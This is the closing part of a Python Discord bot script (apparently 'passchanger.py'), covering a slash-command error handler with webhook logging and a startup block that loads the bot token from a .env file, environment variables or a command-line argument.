async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    traceback.print_exception(type(error), error, error.__traceback__)
    raw = _raw_error(error)
    try:
        e = err("Command Error", f"```{raw[:900]}```")
        if interaction.response.is_done():
            await interaction.followup.send(embed=e, ephemeral=True)
        else:
            await interaction.response.send_message(embed=e, ephemeral=True)
    except Exception:
        pass
    try:
        await send_webhook_log(
            "Command Error",
            f"`/{getattr(interaction.command, 'name', '?')}`  <@{interaction.user.id}>\n{_clip(raw)}",
            color=C_ERROR, user_id=interaction.user.id
        )
    except Exception:
        pass


if __name__ == "__main__":
    here = os.path.dirname(os.path.abspath(__file__))
    env_path = os.path.join(here, ".env")
    if os.path.exists(env_path):
        with open(env_path, encoding="utf-8-sig") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))

    token = (
        os.environ.get("DISCORD_TOKEN")
        or os.environ.get("DISCORD_BOT_TOKEN")
        or os.environ.get("BOT_TOKEN")
        or (sys.argv[1] if len(sys.argv) > 1 else None)
    )

    if not token:
        print("\n  Bot token required.")
        print("  Usage: python passchanger.py <BOT_TOKEN>")
        print("  Or create a .env file with: DISCORD_TOKEN=your_token_here\n")
        sys.exit(1)

    try:
        bot.run(token)
    except discord.errors.LoginFailure:
        print("\n  Invalid token.\n")
    except KeyboardInterrupt:
        print("\n  Shutting down…\n")
    except Exception as e:
        print(f"\n  Fatal: {e}\n")
        traceback.print_exc()